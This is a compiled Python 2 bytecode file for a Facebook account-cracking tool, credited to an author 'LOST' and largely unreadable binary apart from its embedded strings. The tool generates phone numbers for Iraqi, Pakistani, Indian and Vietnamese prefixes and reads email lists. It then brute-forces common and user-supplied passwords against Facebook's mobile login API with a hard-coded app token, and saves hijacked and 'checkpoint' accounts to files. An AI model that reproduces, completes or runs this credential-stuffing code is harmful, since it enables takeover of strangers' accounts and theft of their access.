ó
ÿc           @   sX  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z e j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÍ We j d	  xJ e d
  D]< Z e j d d  Z e d d  e _ e GHe j j   q'Wy d d l Z Wn e k
 re j d  n Xy d d l Z Wn e k
 rÈe j d  n Xy d d l Z Wn8 e k
 re j d  e j d  e j d  n Xd d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z e  e  e j! d  e j   Z" e" j# e   e" j$ e j% j&   d d d2 g e" _' d3 g e" _' d   Z( d   Z) d   Z* d   Z+ d    Z, d d! l- m- Z- d"   Z. d# Z/ d  Z0 g  Z1 g  a2 g  a3 g  Z4 g  Z5 g  Z6 g  Z7 d$   Z8 d%   Z9 d&   Z: d'   Z; d(   Z< d)   Z= d*   Z> d+   Z? d,   Z@ d-   ZA eB d. k rTe j d/  e, d0  e j d1  e8   n  d S(4   i    iÿÿÿÿNs   rm -rf .txtiÐ  iGô i s   .txtt   as   rm -rf ..txtiÄ	  i   iç  s   ..txts   pip2 install tqdms   pip2 install requestss   pip2 install mechanizei   s   python2 .py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   110021328o.pyt   mengetik:   s    c           C   s   d GHt  j j   d  S(   Nt   Keluar(   t   osR   t   exit(    (    (    s   110021328o.pyt   keluarA   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   110021328o.pyt   acakF   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R   (   R   R   R   t   jR   (    (    s   110021328o.pyR   O   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gü©ñÒMbP?(   R   R   R   R	   R
   R   (   R   R   (    (    s   110021328o.pyt   jalanZ   s    (   t   tqdmc          C   sY   t  d d d d d d  8 }  x. t d  D]  } t j d  |  j d  q+ WWd  QXd  S(	   Nt   totalid   t   descs   Loading t
   bar_formats   {l_bar}{bar}g¸ëQ¸?i   (   R%   t   rangeR
   R   t   update(   t   pbarR   (    (    s   110021328o.pyt   loadc   s    s
  
[91m..######.....###....########
[91m.##....##...##.##......##...
[91m.##........##...##.....##...
[93m.##.......##.....##....##...
[92m.##.......#########....##...
[92m.##....##.##.....##....##...
[92m..######..##.....##....##...
[94m
--------------------------------------------------------------------------------------------

Auther     - LOST

YouTube - LOST KURDISH

Github     - https://github.com/LoSt-SoFtware/
--------------------------------------------------------------------------------------------
c           C   s5   t  j d  t GHd GHd GHd GHd d GHt   d  S(   Nt   clears9   [1;96m[[1;96m01[1;96m][1;96m Crack Krdn Laregay Raqams9   [1;96m[[1;96m02[1;96m][1;96m Crack Krdn Laregay Emails2   [1;97m[[1;96m00[1;96m][1;96m Exit this programi2   s   [1;97m~(   R   t   systemt   logot
   pilih_menu(    (    (    s   110021328o.pyt   menu   s    	c          C   sÅ   t  d  }  |  d k r' d GHt   n |  d k s? |  d k rI t   nx |  d k sa |  d k rk t   nV |  d k s |  d	 k r t j d
  n. |  d k s« |  d k rµ t   n d GHt   d  S(   Ns@   [1;97m[[92mâ¢[1;97m] [1;97m( [1;91mChoose[1;97m ) > [92mR   s-   [1;97m[[1;91m![1;97m][1;97m Wrong input !t   1t   01t   2t   02t   3t   03s   python2 crack.pyt   0t   00s'   [1;97m[[1;91mÃ·[1;97m] Wrong input !(   t	   raw_inputR0   t   crack_nomort   crack_emailR   R.   R   (   t   unikers(    (    s   110021328o.pyR0      s    



c           C   s5   t  j d  t GHd GHd GHd GHd d GHt   d  S(   NR-   sA   [1;96m[[1;96m01[1;96m][1;96m Hack Krdn Xera ([92mKorek[97m)sM   [1;96m[[1;96m02[1;96m][1;96m Hack Krdn Ba Be Checkpoint ([92mKorek[97m)s<   [1;96m[[1;96m00[1;96m][1;96m Darchun Lam Basha          i2   s   [1;97m~(   R   R.   R/   t   pilih(    (    (    s   110021328o.pyR;   ¢   s    	c          C   s  t  d  }  |  d k r' d GHt   nØ |  d k s? |  d k rI t   n¶ |  d k sa |  d k rk t   n |  d k s |  d	 k r t   nr |  d
 k s¥ |  d k r¯ t   nP |  d k sÇ |  d k rÑ t   n. |  d k sé |  d k ró t   n d GHt   d  S(   NsE   [1;97m[[92mâ¢[1;97m] [1;97m( [1;91mHalbzhera[1;97m ) > [1;92mR   s-   [1;97m[[1;91mx[1;97m][1;91m Wrong input !R2   R3   R4   R5   R6   R7   t   4t   04t   5t   05R8   R9   s'   [1;97m[[1;91mÃ·[1;97m] Wrong input !(   R:   R>   t   indot   banglat   pakistant   indiat   nguyenR1   (   R=   (    (    s   110021328o.pyR>   ¬   s$    






c             sÔ  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d  d	 }  x0 t |  d
  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd GHd d GHt d  t  j d  d  S(   NR-   s   [94m0770-0771-0772-0773-0774
 0750-0751-0752-0753-0754
  0780-0781-0782-0783-0784

[91m+964 

770-771-772-750-751-752-780-781-782i2   s   [1;97m~s=   [1;97m[[1;92mâ¢[1;97m][1;97m Halbzhera [1;97m :[1;92m i   s6   [1;97m[[1;92m![1;97m][1;96m Kode Dabe 3 pit be  !!R   s   .txtt   rs   [!] File Not Founds	   
[ Back ]s@   [1;97m[[1;92mâ¢[1;97m][1;97m Koy Raqamakan [1;97m:[1;92m i   s/   [1;97m[[1;92m![1;97m] [1;97mTkaya Daymaxa !s   .   s   ..  s   ... s0   [1;97m[[1;92mâ¢[1;97m][1;97m Crack Runnings3   [1;97m
===========================================c            s  |  } y t  j d  Wn t k
 r* n XyFd } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  nd | d k r\d    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  nd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  nad | d k rd    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  næd } t j d    | d | d  } t j |  } d | k r=d    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  n3d | d k r¸d    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  n¸d }	 t j d    | d |	 d  } t j |  } d | k rkd    | d |	 GHt d	 d
  } | j d    | d |	 d  | j	   t
 j | |	  nd | d k ræd    | d |	 GHt d	 d
  } | j d    | d |	 d  | j	   t j | |	  nd }
 t j d    | d |
 d  } t j |  } d | k rd    | d |
 GHt d	 d
  } | j d    | d |
 d  | j	   t
 j | |
  n×d | d k rd    | d |
 GHt d	 d
  } | j d    | d |
 d  | j	   t j | |
  n\d } t j d    | d | d  } t j |  } d | k rÇd    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  n©d | d k rBd    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  n.| } t j d    | d | d  } t j |  } d | k rõd    | d | GHt d	 d
  } | j d    | d | d  | j	   t
 j | |  n{ d | d k rpd    | d | GHt d	 d
  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   Nt   outt   112233445566s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens"   [1;97m[[1;92mSuccessful[1;97m] s    [1;92m|[1;97m s   save/ind.txtR    s   [Berhasil] s    | s   
s   www.facebook.comt	   error_msgs"   [1;97m[[1;91mCheckpoint[1;97m] s    [1;91m|[1;97m s   [Cekpoint] t
   1122334455t
   1234512345t   123456123456t
   1234554321t   123456654321(   R   t   mkdirt   OSErrort   urllibt   urlopent   jsonR,   t   openR   t   closet   okst   appendt   cekpoint(   t   argt   usert   pass1t   dataR   t   okbt   cpst   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   ct   k(    s   110021328o.pyt   mainã   sâ    '%
%
'%
%
'%
%
'%
%
'%
%
'%
%
'%
%
i   s,   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Dones^   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mSuccessful[1;97m/[1;91mCHECK [1;97m: [1;92ms   [1;97m/[1;93msB   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK Save Bun : save/Hacked.txts   [1;97m[[1;92m BACK [1;97m]s   python2 cat.py(   R   R.   R/   R:   R   R   RW   t	   readlinest   idRZ   t   stript   IOErrorR1   R"   R$   R
   R   R   R   R	   R   t   mapRY   R[   (   t   idlistt   linet   xxxt   titikt   oRj   t   p(    (   Rh   Ri   s   110021328o.pyRC   Â   sH    	"

z	)	
c             s¼  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d  d	 }  x0 t |  d
  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d GHd GHd t t t   d GHd GHd GHt d  t  j d  d  S(   NR-   s   [94m0770-0771-0772-0773-0774
 0750-0751-0752-0753-0754
  0780-0781-0782-0783-0784

[91m+964 

770-771-772-750-751-752-780-781-782i2   s   [1;97m~s=   [1;97m[[1;92mâ¢[1;97m][1;97m Halbzhera [1;97m :[1;92m i   s5   [1;97m[[1;92m![1;97m][1;91m Kode Dabe 3 pit be !!R   s   .txtRH   s   [!] File Not Founds   
[ Kembali ]sA   [1;97m[[1;92mâ¢[1;97m][1;97m Hamu Raqamakan [1;97m:[1;92m g      à?s'   [1;97m[[1;92m![1;97m] [1;97mDaymaxas   .   s   ..  s   ... s4   [1;97m[[1;92mâ¢[1;97m][1;97m Crack Daste Pekrdi   sG   [1;97m
===============================================================c   	         s|  |  } y t  j d  Wn t k
 r* n XyC| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  nd | d k rCt d d	  } | j d    | d | d  | j	   t j | |  n*d } t j d    | d | d  } t j |  } d | k röd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  nwd | d k rXt d d	  } | j d    | d | d  | j	   t j | |  nd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  nb d | d k rmt d d	  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RK   s"   [1;97m[[1;92mSuccessful[1;97m] s    [1;92m|[1;97m s   save/bangla1.txtR    s   [Berhasil] s    | s   
s   www.facebook.comRL   s   [Cekpoint] s    â RM   t	   123454321(   R   RR   RS   RT   RU   RV   R,   RW   R   RX   RY   RZ   R[   (	   R\   R]   R^   R_   R   R`   Ra   Rb   Rc   (   Rh   Ri   (    s   110021328o.pyRj     sd    '%
%
'%
%
'%
%
i   s9   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s5   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Tawaw Bu ....sJ   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/ [1;97m: [1;92ms   [1;97m/[1;97ms?   [1;97m[[1;92mâ¢[1;97m] [1;97mOK Save Bu  : save/Hacked.txts   [1;97m[[1;92m BACK [1;97m]s   python2 cat.py(   R   R.   R/   R:   R   R   RW   Rk   Rl   RZ   Rm   Rn   R1   R"   R$   R
   R   R   R   R	   R   Ro   RY   (   Rp   Rq   Rr   Rs   Rt   Rj   Ru   (    (   Rh   Ri   s   110021328o.pyRD   h  sH    	"

:
c             sÌ  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d	  d
 }  x0 t |  d  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d  d  S(    NR-   s.   [1;92m    355-334-335-336-337-338-339-351-352i2   s   [1;97m~s@   [1;97m[[1;92mâ¢[1;97m][1;97m Choose Number [1;97m :[1;92mi   s5   [1;97m[[1;92m![1;97m][1;91m Kode Wajib 3 Digit !!R   s   +92s   .txtRH   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;92mâ¢[1;97m][1;97m Total Number [1;97m:[1;92m g      à?s+   [1;97m[[1;92m![1;97m] [1;97mDon't closes   .   s   ..  s   ... s1   [1;97m[[1;92mâ¢[1;97m][1;97m Crack Running i   s:   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c   	         sÇ  |  } y t  j d  Wn t k
 r* n Xy| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n×d | d k r\d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n\d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n©d | d k rd    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n.d } t j d    | d | d  } t j |  } d | k r=d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n{ d | d k r¸d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   NRv   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RK   s   [1;97m[[1;92mHACK[1;97m] s    [1;92m|[1;97m s   save/pakistan.txtR    s   [Berhasil] s    | s   
s   www.facebook.comRL   s   [1;97m[[1;93mCHECK[1;97m] s    [1;93m|[1;97m s   [Cekpoint] t   786786t   Pakistan(   R   RR   RS   RT   RU   RV   R,   RW   R   RX   RY   RZ   R[   (	   R\   R]   R^   R_   R   R`   Ra   Rb   Rc   (   Rh   Ri   (    s   110021328o.pyRj   ë  sj    '%
%
'%
%
'%
%
i   s9   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s0   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Done....sS   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93msE   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK tersimpan : save/pakistan.txts   [1;97m[[1;92m BACK [1;97m]s   python2 main.py(   R   R.   R/   R:   R   R   RW   Rk   Rl   RZ   Rm   Rn   t   rizky4R"   R$   R
   R   R   R   R	   R   Ro   RY   R[   (   Rp   Rq   Rr   Rs   Rt   Rj   Ru   (    (   Rh   Ri   s   110021328o.pyRE   Ì  sH    	"

:)
c             sÌ  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d	  d
 }  x0 t |  d  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d  d  S(    NR-   s)   [1;92m       905-755-995-855-935-965-975i2   s   [1;97m~s@   [1;97m[[1;92mâ¢[1;97m][1;97m Choose Number [1;97m :[1;92mi   s5   [1;97m[[1;92m![1;97m][1;91m Kode Wajib 3 Digit !!R   s   +91s   .txtRH   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;92mâ¢[1;97m][1;97m Total Number [1;97m:[1;92m g      à?s+   [1;97m[[1;92m![1;97m] [1;97mDon't closes   .   s   ..  s   ... s1   [1;97m[[1;92mâ¢[1;97m][1;97m Crack Running i   s:   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n Xy`| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n©d | d k r\d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n.d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n{ d | d k rd    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   NRv   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RK   s   [1;97m[[1;92mHACK[1;97m] s    [1;92m|[1;97m s   save/india.txtR    s   [Berhasil] s    | s   
s   www.facebook.comRL   s   [1;97m[[1;93mCHECK[1;97m] s    [1;93m|[1;97m s   [Cekpoint] Rx   (   R   RR   RS   RT   RU   RV   R,   RW   R   RX   RY   RZ   R[   (   R\   R]   R^   R_   R   R`   Ra   Rb   (   Rh   Ri   (    s   110021328o.pyRj   O  sL    '%
%
'%
%
i   s1   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;92msD   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK tersimpan : save/bangla1.txts   [1;97m[[1;92m BACK [1;97m]s   python2 main.py(   R   R.   R/   R:   R   R   RW   Rk   Rl   RZ   Rm   Rn   R1   R"   R$   R
   R   R   R   R	   R   Ro   RY   R[   (   Rp   Rq   Rr   Rs   Rt   Rj   Ru   (    (   Rh   Ri   s   110021328o.pyRF   0  sH    	"

*)
c             s  t  j d  t GHd GHd d GHy² t d    t    d k  rM t d  n d d	  d
 GHt d   t d   t d   t d   t d   d }  x0 t |  d  j   D] } t j	 | j
    q´ WWn' t k
 rû d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qVWd GH        f d   } t d  } | j | t  d GHd  GHd! t t t   d" t t t   GHd# GHd GHt d$  t  j d%  d  S(&   NR-   s   [1;92m   357 - 175 - 037 - 918i2   s   [1;97m~sA   [1;97m[[1;92mâ¢[1;97m][1;97m Choose Number [1;97m :[1;92m i   s5   [1;97m[[1;92m![1;97m][1;96m Kode Wajib 3 Digit !!R   s   +84s>   [1;97m[[1;92mâ¢[1;97m] [1;97m Example : [1;92m Nguyen123s+   [1;97m[[92mâ¢[1;97m] Password 1 : [92ms2   [1;97m[[92mâ¢[1;97m] [1;90mPassword 2 : [92ms+   [1;97m[[92mâ¢[1;97m] Password 3 : [92ms2   [1;97m[[92mâ¢[1;97m] [1;90mPassword 4 : [92ms+   [1;97m[[92mâ¢[1;97m] Password 5 : [92ms   .txtRH   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;92mâ¢[1;97m][1;97m Total Number [1;97m:[1;92m g      à?s+   [1;97m[[1;92m![1;97m] [1;97mDon't Closes   .   s   ..  s   ... s1   [1;97m[[1;92mâ¢[1;97m][1;97m Crack Running i   s:   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÌt j d    | d  d  } t j |  } d | k rÛ d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nd | d k rVd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n t j d    | d  d  } t j |  } d | k rd    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nód | d k r~d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nxt j d    | d  d  } t j |  } d | k r+d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nËd | d k r¦d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nPt j d    | d  d  } t j |  } d | k rSd    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n£d | d k rÎd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n(t j d    | d  d  } t j |  } d | k r{d    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n{ d | d k röd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n  Wn n Xd  S(   NRv   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RK   s   [1;97m[[1;92mHACK[1;97m] s    [1;92m|[1;97m s   save/nguyen.txtR    s   [HACK] s    | s   
s   www.facebook.comRL   s   [1;97m[[1;93mCHECK[1;97m] s    [1;93m|[1;97m s   [Cekpoint] s   [CHECK] s   [CHECK]s   [HACK]s   [CHECK(   R   RR   RS   RT   RU   RV   R,   RW   R   RX   RY   RZ   R[   (   R\   R]   R_   R   R`   Ra   (   Rh   Ri   R^   Rb   Rc   Rd   Re   (    s   110021328o.pyRj   ©  s    '%
%
'%
%
'%
%
'%
%
'%
%
i   s9   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Done ....sS   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93msC   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK tersimpan : save/nguyen.txts   [1;97m[[1;92m BACK [1;97m]s   python2 main.py(   R   R.   R/   R:   R   R   RW   Rk   Rl   RZ   Rm   Rn   R1   R"   R$   R
   R   R   R   R	   R   Ro   RY   R[   (   Rp   Rq   Rr   Rs   Rt   Rj   Ru   (    (   Rh   Ri   R^   Rb   Rc   Rd   Re   s   110021328o.pyRG     sT    	"

!U)
c             sü  t  j d  t GHy  d GHt d    d GHt d   d GHt d   t d   t d	   t d
   t d   d }  x0 t |  d  j   D] } t j | j    q WWn' t	 k
 rÛ d GHt d  t
   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  q6Wd GH        f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d   t  j d!  d  S("   NR-   sE   [1;97m[[1;92mâ¢[1;97m][1;97m Example[1;97m :[1;92m Hama.Mhamads>   [1;97m[[1;92mâ¢[1;97m][1;97m Nama Target[1;97m :[1;92m sF   [1;97m[[1;92mâ¢[1;97m][1;97m Example [1;97m: [1;92m@hotmail.coms?   [1;97m[[1;92mâ¢[1;97m][1;97m Domain Email[1;97m :[1;92m sA   [1;97m[[1;92mâ¢[1;97m][1;97m Example [1;97m: [1;92mHama123s<   [1;97m[[1;92mâ¢[1;97m][1;97m Password1[1;97m :[1;92m s<   [1;97m[[1;92mâ¢[1;97m][1;90m Password2[1;97m :[1;92m s<   [1;97m[[1;92mâ¢[1;97m][1;97m Password3[1;97m :[1;92m s<   [1;97m[[1;92mâ¢[1;97m][1;90m Password4[1;97m :[1;92m s<   [1;97m[[1;92mâ¢[1;97m][1;97m Password5[1;97m :[1;92m s   ..txtRH   s   [!] File Not Founds   
[ Kembali ]s>   [1;97m[[1;92mâ¢[1;97m][1;97m Total Email [1;97m:[1;92m i   s+   [1;97m[[1;92m![1;97m] [1;97mDon't Closes   .   s   ..  s   ... s1   [1;97m[[1;92mâ¢[1;97m][1;97m Crack Running s:   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÍt j d   |  d  d  } t j |  } d | k rÛ d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nd | d k rVd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n¡t j d   |  d  d  } t j |  } d | k rd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nôd | d k r~d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nyt j d   |  d  d  } t j |  } d | k r+d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nÌd | d k r¦d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nQt j d   |  d  d  } t j |  } d | k rSd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   n¤d | d k rÎd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n)t j d   |  d  d  } t j |  } d | k r{d   |  d  GHt d d	  } | j d   |  d  d  | j	   t
 j |   n| d | d k r÷d   |  d  GH| j d d	  | j d   |  d  d  | j	   t j |   n  Wn n Xd  S(   NRv   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RK   s"   [1;97m[[1;92mSuccessful[1;97m] s    [1;92m|[1;97m s   save/email.txtR    s   [Berhasil] s    | s   
s   www.facebook.comRL   s"   [1;97m[[1;91mCheckpoint[1;97m] s    [1;91m|[1;97m s   [Cekpoint] s
   [Berhasil]s
   [Cekpoint](   R   RR   RS   RT   RU   RV   R,   RW   R   RX   RY   RZ   R[   (   R\   R]   R_   R   R`   Ra   (   Rh   Ri   R^   Rb   Rc   Rd   Re   (    s   110021328o.pyRj   -  s    '%
%
'%
%
'%
%
'%
%
'%
%
i   s1   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s2   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Tawaw ....sS   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms>   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK Hamuy : save/email.txts1   [1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s   [1;97m[[1;92m BACK [1;97m]s   python2 cat.py(   R   R.   R/   R:   RW   Rk   Rl   RZ   Rm   Rn   R1   R"   R   R$   R
   R   R   R   R	   R   Ro   RY   R[   (   Rp   Rq   Rr   Rs   Rt   Rj   Ru   (    (   Rh   Ri   R^   Rb   Rc   Rd   Re   s   110021328o.pyR<   	  sR    

!U)
t   __main__R-   s   Baxerbey Bo Naw Toolaka :)i   (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](C   t   Falset   foot   barR   R   R
   t   datetimeR   t   hashlibt   ret	   threadingRV   RT   t	   cookielibt   getpassR.   R)   t   nR   t   nmbrRW   R   R	   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R$   R%   R,   R/   t   backt   berhasilR[   RY   R`   Rl   t   cpbRa   R1   R0   R;   R>   RC   RD   RE   RF   RG   R<   t   __name__(    (    (    s   110021328o.pyt   <module>   s   

								
		
		¦	d	d	T		
